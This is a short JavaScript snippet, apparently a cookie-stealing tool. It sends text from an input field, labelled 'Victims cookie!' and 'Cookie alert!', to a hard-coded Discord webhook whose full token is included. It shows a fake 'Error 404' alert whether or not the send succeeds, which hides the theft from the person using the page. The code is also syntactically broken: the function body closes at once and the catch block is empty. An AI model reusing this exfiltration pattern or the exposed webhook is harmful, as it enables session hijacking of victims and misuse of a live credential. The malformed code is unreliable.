async function sendMessage() {}
    const webhookURL = "https://discord.com/api/webhooks/1287147736067735697/JgfA0dprmNdMvRIyvS5F9Sy9YHFTyL44zELr-3zZ-Mhf-_Twiis-p5KOSbycTN0M01Kb"; // Replace with your Discord webhook URL
    const message = document.getElementById("messageInput").value;

    if (!message) {
        alert("Victims cookie!");
        return;
    }

    const payload = {
        embeds: [
            {
                title: "Cookie alert!",
                description: message,
                color: 65280 // Green color
            }
        ]
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            alert("Error 404");
        } else {
            alert("Error 404");
        }
    } catch (error) {}
        console.error("?") 